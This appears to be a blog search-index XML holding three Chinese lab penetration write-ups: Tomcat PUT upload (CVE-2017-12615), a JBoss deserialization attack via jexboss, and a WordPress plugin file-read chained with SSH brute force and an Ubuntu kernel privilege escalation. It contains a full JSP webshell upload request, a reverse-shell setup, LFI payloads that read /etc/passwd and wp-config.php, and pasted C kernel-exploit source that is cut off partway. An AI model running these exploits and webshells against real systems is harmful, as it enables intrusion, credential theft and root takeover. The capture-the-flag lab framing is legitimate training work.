<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
      <link href="post/85292c15.html"/>
      <url>post/85292c15.html</url>
      
        <content type="html"><![CDATA[<h1 id="TOMCAT-UPLOAD"><a href="#TOMCAT-UPLOAD" class="headerlink" title="TOMCAT_UPLOAD"></a>TOMCAT_UPLOAD</h1><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>对端口进行扫描  nmap -sS -n 192.168.7.195</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223348.png"></p><p>发现8080端口开启了http服务，如果不确认可以输入nmap -sA -p 8080 -n 192.168.7.195详细查看</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223342.png"></p><p>访问8080端口，发现为Tomcat服务器</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223332.png"></p><p>搜索一下发现Apache Tomcat/8.5.19存在Tomcat PUT方法任意写文件漏洞，当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。</p><p>尝试Tomcat的PUT方法任意写漏洞，打开Burp Suite，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223303.png"></p><p>尝试构造如下数据包发送一句话shell，通过PUT方法向Tomcat根目录下写入2.jsp文件，如下图所示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PUT /<span class="number">2.</span>jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.7</span><span class="number">.195</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">86.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">86.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Connection: closeUpgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Length: 396</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span></span><br><span class="line"><span class="comment">&lt;%</span></span><br><span class="line"><span class="comment">try &#123;</span></span><br><span class="line"><span class="comment">String cmd = request.getParameter(&quot;cmd&quot;);</span></span><br><span class="line"><span class="comment">Process child = Runtime.getRuntime().exec(cmd);</span></span><br><span class="line"><span class="comment">InputStream in = child.getInputStream();</span></span><br><span class="line"><span class="comment">int c;</span></span><br><span class="line"><span class="comment">while ((c = in.read()) != -1) &#123;</span></span><br><span class="line"><span class="comment">out.print((char)c);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">in.close();</span></span><br><span class="line"><span class="comment">try &#123;</span></span><br><span class="line"><span class="comment">child.waitFor();</span></span><br><span class="line"><span class="comment">&#125; catch (InterruptedException e) &#123;</span></span><br><span class="line"><span class="comment">e.printStackTrace();</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">System.err.println(e);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">%&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223255.png"></p><p>代码的含义是获取网页的cmd参数，通过Runtime.getRuntime().exec(cmd)方法执行并返回成功执行结果或报错信息。</p><p>尝试访问/etc/passwd文件，能成功访问，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223245.png"></p><p>浏览当前目录下文件，发现有flag.txt文件，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223239.png"></p><p>使用命令cat flag.txt命令，查看flag.txt文件，得到第一个flag。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223229.png"></p><p>继续查看，发现root下面有一个flag.txt</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223222.png"></p><p>打开flag.txt，发现flag2</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302223211.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat-PUT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透之JexBoss-Joss</title>
      <link href="post/ac26cec4.html"/>
      <url>post/ac26cec4.html</url>
      
        <content type="html"><![CDATA[<h1 id="JexBoss-Jboss靶机渗透实战"><a href="#JexBoss-Jboss靶机渗透实战" class="headerlink" title="JexBoss-Jboss靶机渗透实战"></a>JexBoss-Jboss靶机渗透实战</h1><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>（1）信息收集-端口扫描</p><p>1.扫描端口（masscan)</p><p>masscan –rate=10000 –ports 0-65535 192.168.7.30</p><p>masscan –rate=每秒多少个数据包 –ports 端口范围  IP地址/IP地址段</p><blockquote><p>Masscan扫描速度快，为了防止漏扫，可以多扫描几次；</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302142857.png"></p><p>2.扫描端口的详细信息（nmap）</p><p>nmap -sV -T4 192.168.7.30</p><p>nmap -sV -T4 -A  192.168.7.30</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302142916.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143302.png"></p><blockquote><ul><li>其中：-T4指定扫描过程中使用的时序（分为0-5等级）；</li><li>-sV扫描版本的信息和开启的服务；</li><li>也可以选择带-A参数，详细扫描开放端口的具体服务；</li><li>与masscan相比，namp更详细，但是速度较慢（可以通过masscan快速扫描，再使用nmap扫描具体开放的端口）</li></ul></blockquote><p>（2）渗透测试</p><p>经过上面的信息发现开启了80,22,8080,3389端口，在浏览器中访问8080端口，发现为Jboss搭建网站，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143344.png"></p><p>尝试使用Jboss反序列化脚本，在kali攻击中输入git clone <a href="https://github.com/joaomatosf/jexboss.git%E5%85%8B%E9%9A%86%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA">https://github.com/joaomatosf/jexboss.git克隆脚本，如图所示</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143344.png"></p><p>输入cd jexboss，进入jexboss工具目录，输入pip install -r requires.txt命令，进行安装，如图所示</p><p>如果未能执行pip命令，参照</p><blockquote><p><a href="https://www.cnblogs.com/zhongyehai/p/10619917.html">https://www.cnblogs.com/zhongyehai/p/10619917.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143357.png"></p><p>提前进行端口的监听，输入命令nc –lvp 1234，监听1234端口。如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302114616.png"></p><p>运行脚本，执行攻击命令python jexboss.py -host <a href="http://192.168.7.30:8080/">http://192.168.7.30:8080</a>其中，192.168.7.30为靶机地址。如图所示。</p><p>在弹出的第一个选项中，选择【no】，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143448.png"></p><p>在弹出的第二个选项中，选择【yes】，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143501.png"></p><p>在【IP Address】项填写172.16.11.51（攻击机地址），【Port】填写1234.输入回车确定。如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143509.png"></p><p>回到之前开启的监听端口菜单，可以看到，反弹shell成功，拥有root权限。如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143519.png"></p><p>在根目录找到第一个flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143600.png"></p><p>在/home目录寻找第二个flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302143555.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主机渗透 </tag>
            
            <tag> JexBoss </tag>
            
            <tag> Jboss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透之WordPress插件漏洞+Ubuntu提权漏洞</title>
      <link href="post/c3d0b69.html"/>
      <url>post/c3d0b69.html</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress插件漏洞-Ubuntu提权漏洞"><a href="#WordPress插件漏洞-Ubuntu提权漏洞" class="headerlink" title="WordPress插件漏洞+Ubuntu提权漏洞"></a>WordPress插件漏洞+Ubuntu提权漏洞</h1><h2 id="渗透过程："><a href="#渗透过程：" class="headerlink" title="渗透过程："></a>渗透过程：</h2><p>①、访问目标站点，发现目标网站使用WordPress搭建</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302000909.png"></p><p>②、使用wpscan对目标地址进行扫描，wpscan –url 192.168.7.147</p><blockquote><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能</p><p>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p></blockquote><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003434.png" alt="image-20210223101542894" style="zoom:150%;" /><p>发现wp-with-spritz插件</p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003447.png" alt="image-20210223101511219" style="zoom:150%;" /><p>搜索可以发现关于这个插件的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. Version Disclosure</span><br><span class="line"> </span><br><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;wp-with-spritz&#x2F;readme.txt</span><br><span class="line"> </span><br><span class="line">2. Source Code</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#39;url&#39;]))&#123;</span><br><span class="line">$content&#x3D;file_get_contents($_GET[&#39;url&#39;]);</span><br><span class="line"> </span><br><span class="line">3. Proof of Concept</span><br><span class="line"> </span><br><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;wp-with-spritz&#x2F;wp.spritz.content.filter.php?url&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;wp-with-spritz&#x2F;wp.spritz.content.filter.php?url&#x3D;http(s):&#x2F;&#x2F;domain&#x2F;exec</span><br></pre></td></tr></table></figure><p>利用文件读取漏洞进行访问<a href="http://192.168.7.147/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd%EF%BC%8C%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0flag1%7B183a43921c7899a228477733fc1eabbf%7D,%E5%B9%B6%E5%8F%91%E7%8E%B0%E7%94%A8%E6%88%B7%E5%90%8Dwebtester">http://192.168.7.147/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd，成功拿到flag1{183a43921c7899a228477733fc1eabbf},并发现用户名webtester</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003456.png"></p><p>另外WordPress的基础配置文件wp-config.php可能会包含数据库信息和用户信息，利用上述的链接构造同样的</p><p>访问：<a href="http://192.168.7.147/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php">http://192.168.7.147/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003502.png"></p><p>检查源代码获得flag2{f5d3b0e747b6ce04024bc45a5d0f031d}，并查看到数据库名wordpress，用户名root，密码D6EqQLuU</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003510.png"></p><p>③、利用namp扫描端口，查看是否有利用端口nmap -A 192.168.7.147</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003517.png"></p><p>④、使用hydra进行ssh弱口令密码爆破，爆出密码为Sunday</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003526.png"></p><p>⑤、使用账户和密码进行ssh登录，在目录中发现了flag3</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003532.png"></p><p>⑥、使用上面发现的数据库用户和密码：root/D6EqQLuU登录数据库</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003540.png"></p><p>⑦、发现有个flag数据库，查询下数据库中的表，发现有个flag表，查询内容，发现flag4</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003546.png"></p><p>⑧、进行提权</p><p>1.查看当前系统版本 cat/proc/veersion</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003553.png"></p><p>发现为Ubuntu，在Ubuntu16.04版本且unprivileged_bpf_disable权限没有关闭的情况下就会存在提权漏洞</p><p>2.查看是否存在unprivileged_bpf_disable文件，如果存在该文件，查看文件内容是否为1，若不是1，则存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003558.png"></p><p>3.在攻击主机上新建文件upstream44.c，内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">all credits to @bleidl</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">vnik</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.prog_type = prog_type,</span><br><span class="line">.insns = (__u64)insns,</span><br><span class="line">.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">.license = (__u64)license,</span><br><span class="line">.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">.log_size = LOG_BUF_SIZE,</span><br><span class="line">.log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">attr.kern_version = kern_version;</span><br><span class="line"></span><br><span 